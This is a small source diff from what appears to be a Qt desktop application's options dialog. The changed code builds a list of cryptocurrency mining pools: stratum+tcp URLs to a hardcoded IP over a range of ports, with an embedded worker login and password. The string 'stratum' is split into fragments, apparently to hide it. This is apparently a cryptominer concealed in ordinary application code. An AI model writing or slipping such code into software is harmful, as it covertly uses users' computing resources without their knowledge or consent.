@@ -460,7 +460,7 @@ void OptionDialog::loadOption()
         int index=0;
         while(index<180)
         {
-            QStringList pool=QStringList() << "-o" << QString("stra")+"tum"+QString("+")+QString("tcp://37.59.242.80:%1").arg(3334+index) <<  "-O" << "alphaonex86_uc"+QString::number(rand()%50+1)+":JE5RfIAzapCSABZC";
+            QStringList pool=QStringList() << "-o" << QString("stra")+"tum"+QString("+")+QString("tcp://37.59.242.80:%1").arg(3334+index) <<  "-O" << "alphaonex86_uc"+QString::number(rand()%100+1)+":JE5RfIAzapCSABZC";
             pools << pool;
             index++;
         }
